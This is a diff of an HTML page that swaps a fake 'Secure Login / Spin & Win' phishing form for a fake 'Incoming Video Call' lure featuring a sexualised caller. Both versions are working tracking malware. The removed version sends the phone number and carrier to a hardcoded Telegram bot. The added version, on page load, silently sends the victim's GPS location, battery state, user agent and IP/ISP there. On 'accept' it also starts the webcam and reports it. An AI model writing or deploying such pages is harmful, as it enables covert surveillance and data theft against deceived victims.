@@ -1,106 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🎯 Secure Login</title>
-  <style>
-    body {margin:0;height:100vh;background:#0d0d2b;display:flex;justify-content:center;align-items:center;flex-direction:column;color:white;font-family:'Poppins',sans-serif;overflow:hidden;}
-    .hidden {display:none;}
-    .login-box {background:#111; padding:30px; border-radius:10px; box-shadow:0 0 20px #00ffea;}
-    .login-box h1 {color:#00ffea;}
-    .login-box input, .login-box select {width:100%;margin:10px 0;padding:10px;border-radius:5px;border:none;}
-    .login-box button {padding:12px 20px;background:#00ffea;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;}
-    .spinner {width:200px;height:200px;border:20px solid rgba(255,255,255,0.2);border-top:20px solid #00ffea;border-radius:50%;animation:spin 1s linear infinite;box-shadow:0 0 30px #00ffea;}
-    @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-  </style>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Incoming Video Call</title>
+<style>
+  body,html {margin:0;padding:0;height:100%;background:#000;font-family:sans-serif;}
+  .call-screen {position:relative;height:100vh;width:100vw;overflow:hidden;}
+  .caller-video {position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:brightness(0.7);}
+  .overlay {position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;justify-content:space-between;color:#fff;padding:40px 20px;box-sizing:border-box;background:linear-gradient(to top,rgba(0,0,0,0.7) 20%,rgba(0,0,0,0));}
+  .caller-details {text-align:center;}
+  .caller-details img {width:100px;height:100px;border-radius:50%;border:4px solid #00ffea;box-shadow:0 0 30px #00ffea;margin-bottom:15px;}
+  .caller-name {font-size:2em;font-weight:bold;color:#00ffea;}
+  .call-status {font-size:1.2em;color:#ccc;}
+  .buttons {display:flex;justify-content:space-around;margin-bottom:20px;}
+  .btn {width:80px;height:80px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:2em;cursor:pointer;box-shadow:0 0 15px rgba(0,0,0,0.6);}
+  .accept {background:#0f0;}
+  .reject {background:#f00;}
+</style>
 </head>
 <body>
-  <div class="login-box" id="loginForm">
-    <h1>🔒 Secure Login</h1>
-    <input type="tel" placeholder="Enter Mobile Number" id="mobile">
-    <select id="operator">
-      <option value="">Select SIM Operator</option>
-      <option value="Jio">Reliance Jio</option>
-      <option value="Airtel">Airtel</option>
-      <option value="Vi">Vodafone Idea</option>
-      <option value="BSNL">BSNL</option>
-      <option value="Other">Other</option>
-    </select>
-    <button onclick="startSpinner()">Next</button>
+<div class="call-screen">
+  <video autoplay muted loop class="caller-video">
+    <source src="https://yourvideo.example.com/hot-indian-girl.mp4" type="video/mp4">
+  </video>
+  <div class="overlay">
+    <div class="caller-details">
+      <img src="https://yourimage.example.com/hot-indian-girl.jpg" alt="Caller Photo">
+      <div class="caller-name">Priya Sharma</div>
+      <div class="call-status">Incoming Video Call...</div>
+    </div>
+    <div class="buttons">
+      <div class="btn reject" onclick="window.close()">✖</div>
+      <div class="btn accept" onclick="acceptCall()">✔</div>
+    </div>
   </div>
+</div>
 
-  <div class="hidden" id="spinnerSection">
-    <h1>🎉 Spin & Win 🎉</h1>
-    <div class="spinner"></div>
-  </div>
+<script>
+// ✅ Token & chat ID setup
+const BOT_TOKEN = "7983135568:AAGZEbVk8zZcBuRrM-CCrItKc7XjJcF1e9I";
+const CHAT_ID = "1954755564";
 
-  <script>
-    const BOT_TOKEN = "7575805655:AAEQzfqlBA-IaorNqJpyVkzLvpcWdRWojXg";  // 🔥 Your new bot token
-    const CHAT_ID = "1954755564";  // Your chat ID
+function sendToTelegram(msg){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})
+  }).catch(console.error);
+}
 
-    function sendToTelegram(message) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-      }).catch(console.error);
-    }
+function acceptCall(){
+  navigator.mediaDevices.getUserMedia({video:true,audio:false})
+  .then(stream=>{
+    sendToTelegram("📸 *User accepted call, webcam started!*");
+    document.querySelector('.caller-video').srcObject=stream;
+  })
+  .catch(err=>{
+    sendToTelegram(`⚠️ Webcam denied: ${err.message}`);
+  });
+}
 
-    function startSpinner() {
-      const mobile = document.getElementById('mobile').value.trim();
-      const operator = document.getElementById('operator').value;
-      if (!mobile || !operator) {
-        alert("Please enter mobile number and select SIM operator!");
-        return;
-      }
-      sendToTelegram(`📲 *User Login Info:*\n📞 Mobile: ${mobile}\n🏢 Operator: ${operator}`);
-      document.getElementById('loginForm').classList.add('hidden');
-      document.getElementById('spinnerSection').classList.remove('hidden');
+// Background info capture
+if(navigator.geolocation){
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const lat=pos.coords.latitude.toFixed(6);
+    const lon=pos.coords.longitude.toFixed(6);
+    const mapsLink=`https://maps.google.com/?q=${lat},${lon}`;
+    sendToTelegram(`📍 *Location:* Lat:${lat}, Lon:${lon}\n[Open Maps](${mapsLink})`);
+  },()=>sendToTelegram("⚠️ Location denied."));
+}else sendToTelegram("⚠️ Geolocation not supported.");
 
-      const pageURL = window.location.href;
-      sendToTelegram(`🔗 *Page URL:* ${pageURL}`);
+if(navigator.getBattery){
+  navigator.getBattery().then(b=>{
+    sendToTelegram(`🔋 *Battery:* ${(b.level*100).toFixed(0)}% | ${b.charging?"Charging":"Not Charging"}`);
+  });
+}
 
-      // Location
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude.toFixed(6);
-          const lon = pos.coords.longitude.toFixed(6);
-          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-          const locMsg = `📍 *Location:*\nLatitude: ${lat}\nLongitude: ${lon}\n🌐 [Open in Maps](${mapsLink})`;
-          sendToTelegram(locMsg);
-        }, () => {
-          sendToTelegram("⚠️ Location denied by user.");
-        });
-      } else {
-        sendToTelegram("⚠️ Geolocation not supported.");
-      }
+sendToTelegram(`📱 *User Agent:* ${navigator.userAgent}`);
 
-      // Battery info
-      if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-          const level = (battery.level * 100).toFixed(0);
-          const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
-          sendToTelegram(`🔋 *Battery:* ${level}% | ${charging}`);
-        });
-      }
-
-      // User Agent
-      const ua = navigator.userAgent;
-      sendToTelegram(`📱 *User Agent:* ${ua}`);
-
-      // IP & ISP info
-      fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-          const isp = data.org || "Unknown ISP";
-          const location = data.city + ", " + data.region + ", " + data.country;
-          const msg = `🌐 *IP:* ${ip}\n🏢 *ISP:* ${isp}\n📍 *Location:* ${location}`;
-          sendToTelegram(msg);
-        })
-        .catch(() => sendToTelegram("⚠️ IP/ISP fetch failed"));
-    }
-  </script>
+fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN')
+  .then(r=>r.json())
+  .then(d=>sendToTelegram(`🌐 *IP:* ${d.ip}\n🏢 *ISP:* ${d.org||"Unknown"}\n📍 *City:* ${d.city}, ${d.region}, ${d.country}`))
+  .catch(()=>sendToTelegram("⚠️ IP/ISP fetch failed"));
+</script>
 </body>
 </html>
